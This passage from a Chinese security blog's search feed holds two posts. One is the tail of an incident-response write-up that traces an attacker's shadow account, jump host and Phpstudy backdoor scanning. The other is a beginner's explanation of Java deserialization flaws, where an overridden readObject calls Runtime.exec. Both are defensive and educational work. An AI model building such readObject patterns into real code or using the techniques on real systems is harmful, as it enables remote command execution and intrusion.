id="攻击源IP-loxxxxo影子用户分析："><a href="#攻击源IP-loxxxxo影子用户分析：" class="headerlink" title="攻击源IP loxxxxo影子用户分析："></a>攻击源IP loxxxxo影子用户分析：</h3><p>通过查看服务器端口连接情况发现与该服务器3389远程连接有一个IP 175.xxx.xxx.138（上海 腾讯云），极大可能也为肉鸡。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/yz-3.png" title="连接情况"><br>同时查看当前服务器在线用户，该影子用户loxxxxo$处于连接在线状态，也就是说上述的175.xxx.xxx.138的腾讯云服务器即为该影子用户的远程连接主机。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/yz-4.png" title="在线情况"><br>通过信息查看loxxxxo$用户创建时间为2022年9月20日（不排除为后续修改密码后的时间）（因此说明10号上传的webshell的攻击者与该用户不为同一人）。<br><img src="/2022/10/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%99%AE%E9%80%9A%E7%9A%84%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5/yz-5.png" title="创建情况"> </p><p><strong>简述该用户信息：</strong><br>1、影子用户：loxxxxo$<br>2、远程连接主机：175.xxx.xxx.138（上海 腾讯云）<br>3、9月20日甚至跟早入侵该攻击源IP并作为跳板对外扫描Phpstudy后门，同时利用入侵主机部署黑灰产软件获益。<br>4、其中一个黑灰产软件使用的他的会员号：AG-xxx</p><h3 id="后续思路："><a href="#后续思路：" class="headerlink" title="后续思路："></a>后续思路：</h3><p>1、针对175.xxx.xxx.138攻击主机，简单看了一下，开了80端口 但没什么应用部署，也没查到相关威胁情报信息，极大可能也为跳板机。<br>2、针对黑灰产软件上的会员号信息，涉及到网站jingxxx.taxxx.com，意思得获取这个网站权限在查相关用户信息，工作量较大，仅思考了下。</p><h3 id="总结事件线："><a href="#总结事件线：" class="headerlink" title="总结事件线："></a>总结事件线：</h3><p>该源IP被很早入侵并使用phpstudy部署了几套web游戏系统——&gt;真实攻击者持有IP175.xx.xx.138通过phpstudy后门扫到该服务器存在后门，并通过后门获取服务器权限，同时创建了影子账户loxxxxo$——&gt;该用户上传黑灰产软件运行挂机收益，同时定期使用Phpstudy批量扫描工具对全网扫描——&gt;10月10日凌晨扫描至单位业务系统服务器触发告警。</p><h2 id="0x03、总结"><a href="#0x03、总结" class="headerlink" title="0x03、总结"></a>0x03、总结</h2><p>本次溯源并未实际溯源到真实用户，排查过程也很仓储，也没去找最开始的入侵痕迹，简单排查告警触发后的溯源分析过程，了解攻击者的入侵思路和入侵意图，再进一步的话可能从后续思路再入手，但可能短时间获取不到有用信息，就先这样记录下吧。</p>]]></content>
      
      
      <categories>
          
          <category> 实战记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-初识反序列化</title>
      <link href="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h2><p>学习java基础知识记录，方便查阅。</p><h2 id="0x01、反序列化是什么？有什么用？"><a href="#0x01、反序列化是什么？有什么用？" class="headerlink" title="0x01、反序列化是什么？有什么用？"></a>0x01、反序列化是什么？有什么用？</h2><blockquote><p>  Java 提供了一种对象序列化的机制，该机制中，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。 </p></blockquote><p>java序列化会更有利于传输，它的速度会更快，并且也会更安全，被调用方序列化，调用方反序列化即能够得到传输之前的最原始的java对象，常常用来做不同进程之间的对象传输。能够更加便于储存，不论是存储成文件又或者是存储成数据库都是可以的，存储成文件，下次要用可以直接反序列拿到对象。</p><h2 id="0x02、反序列化如何实现"><a href="#0x02、反序列化如何实现" class="headerlink" title="0x02、反序列化如何实现"></a>0x02、反序列化如何实现</h2><p>实现方法：通过该对象所处类实现<font color=red>Serializable</font>接口，调用<font color=red>writeObject()</font>方法序列化、<font color=red>readObject()</font>方法反序列化分别对对象进行数据转换的写入和读取。</p><p><font color=red>writeObject()</font>序列化：将java对象转换成java字节序列、json、xml等数据格式的过程，利用ObjectOutputStream流接口把对象序列化数据写入文件。<br><font color=red>readObject()</font>反序列化：将java字节序列、json、xml等数据格式还原成java对象的过程，利用ObjectInputStream流接口把序列化文件读取并恢复成对象。</p><p>一个类的对象要想序列化成功，必须满足两个条件：<br>1、该类必须实现 java.io.Serializable 接口。<br>2、该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。<br>注：不可序列化的属性：带static修饰（静态变量）和transient修饰（临时变量）的属性，对于transient属性序列化机制会跳过而不会将其写入文件，但在读取时也不可恢复，该属性值保持默认初始化值。</p><h2 id="0x03、反序列化代码实现demo"><a href="#0x03、反序列化代码实现demo" class="headerlink" title="0x03、反序列化代码实现demo"></a>0x03、反序列化代码实现demo</h2><p>新建java项目，创建pack包，新建java程序，不赘述了。</p><h3 id="类对象："><a href="#类对象：" class="headerlink" title="类对象："></a>类对象：</h3><p>创建people类，并实现<font color=red>Serializable</font>接口<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/classpeople.png" title="people类"></p><h3 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h3><p>创建demo类，实现对people类对象调用并实例化输出<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ser.png" title="序列化过程"><br>查看输出txt为序列化数据<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/sertxt.png" title="序列化结果"><br>生成的数据文件为16进制，乱码显示以  sr开头</p><blockquote><p>  java原生序列化的16进制是以aced00057372开头、base64编码是以rO0ABXNy开头</p></blockquote><h3 id="反序列化："><a href="#反序列化：" class="headerlink" title="反序列化："></a>反序列化：</h3><p>创建unser类，实现对序列化文件进行反序列化读取并输出。<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/unser.png" title="序列化结果"></p><p>以上过程为一个简单的序列化与反序列化的过程。</p><h2 id="0x04、安全成因"><a href="#0x04、安全成因" class="headerlink" title="0x04、安全成因"></a>0x04、安全成因</h2><p>与其说是漏洞成因，不妨说是安全成因，单从上述的反序列化过程似乎没发现怎么变成常谈的java反序列化漏洞，既然是反序列化漏洞，那重点就在反序列化上，即readObject()方法;<br>学习总结的漏洞成因要素：<br>1、readObject()方法被重写，当实现Servializable类并重写了readObject()方法，系统执行反序列化时会调用重写的readObject()方法。<br>2、重写的readObject()方法含有危险方法，如方法中直接执行Runtime.getRuntime().exec();<br>3、重写的readObject()方法中存在调用其它类的可控变量并执行危险函数。<br>4、套娃3步骤，调用其它类中变量再次调用另外一个类中的方法。#可以理解为常说的gadget链，通俗点说就是漏洞利用链。</p><h3 id="案例demo-1"><a href="#案例demo-1" class="headerlink" title="案例demo-1"></a>案例demo-1</h3><p><strong>重写readObject方法并直接执行危险函数</strong><br>实现Servializable类的实例类重写了readObject()方法，readObject()方法执行了危险函数。<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-1.png" title="readObject方法重写"><br>这是执行反序列化步骤 发现危险函数被执行<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-2.png" title="危险函数被执行"><br>通过调试可以认证这点<br>在调用readObject()方法处下断点<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-3.png" title="调试"><br>可看到调用重写的readObject()方法<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-3-1.png" title="调试"></p><h3 id="案例demo-2"><a href="#案例demo-2" class="headerlink" title="案例demo-2"></a>案例demo-2</h3><p><strong>重写readObject方法，方法中调用了其他类中的危险方法</strong><br>新建立一个exec类，其中exec类使用了危险函数。<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-4-1.png" title="exec类"><br>重写readObject方法，方法中调用了exec类对象。<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-4-2.png" title="readObject方法重写"><br>同样运行反序列化操作，同样实现了反序列化漏洞，执行了命令<br><img src="/2022/09/27/java%E5%AE%89%E5%85%A8-%E5%88%9D%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/anli-4-3.png" title="readObject方法重写"></p><p>上诉案例仅提供漏洞造成原理思路，实际漏洞调用链远比其复杂。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
